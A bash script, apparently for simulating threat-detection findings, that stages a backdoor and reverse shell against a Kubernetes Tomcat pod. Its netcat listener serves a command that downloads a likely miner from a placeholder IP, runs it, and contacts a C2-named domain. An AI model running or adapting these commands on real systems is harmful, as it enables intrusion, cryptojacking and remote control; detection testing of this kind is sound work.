#!/bin/bash

POD_NAME="tomcat-pod"

echo "Getting the pod IP of the Tomcat pod..."
IP=`kubectl get pods $POD_NAME -o jsonpath='{.status.podIP}'`
echo "The Tomcat pod IP is $IP."
echo

echo "Injecting Java code to create a backdoor (run.jsp) that creates a reverseshell to CnC..."
curl http://$IP:8080/

echo
echo "Using netcat to listen on port 4444 to receive a reverseshell connection and execute commands...."
nohup kubectl exec -it $POD_NAME -- timeout 60s bash -c "echo 'wget http://203.0.113.1:33333/ls -O /tmp/cnrig;chmod +x /tmp/cnrig;/tmp/cnrig;curl --connect-timeout 1 http://c2.guarddutyc2activityb.com/' | nc -nlp 4444 &" 2>&1 &

sleep 10

echo
echo "Triggering the backdoor run.jsp to create a reverseshell to CnC and execute commands...."
timeout 20s curl http://$IP:8080/run.jsp

